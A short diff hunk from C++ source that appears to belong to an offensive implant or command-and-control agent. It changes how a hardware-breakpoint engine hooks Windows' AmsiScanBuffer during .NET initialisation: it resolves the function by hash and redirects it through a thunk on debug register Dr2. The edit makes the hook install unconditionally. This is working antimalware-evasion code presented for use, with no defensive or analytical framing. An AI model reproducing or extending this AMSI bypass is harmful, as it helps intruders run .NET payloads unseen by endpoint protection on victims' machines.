@@ -429,10 +429,10 @@ auto DECLFN HwbpEng::DotnetInit( VOID ) -> BOOL {
                     this->Amsi.AmsiScanBuffer = (UPTR)LdrLoad::Api<UPTR>( this->Amsi.Handle, Hsh::Str( "AmsiScanBuffer" ) );
                     KhDbg("AmsiScanBuffer %p", this->Amsi.AmsiScanBuffer );
                 }
-
-                Success = this->Install( this->Amsi.AmsiScanBuffer, Dr2, (PVOID)this->AmsiThunk, Self->Session.ThreadID );
-                if ( ! Success ) return Success;
             }
+
+            Success = this->Install( this->Amsi.AmsiScanBuffer, Dr2, (PVOID)this->AmsiThunk, Self->Session.ThreadID );
+            if ( ! Success ) return Success;
         }
     }
 
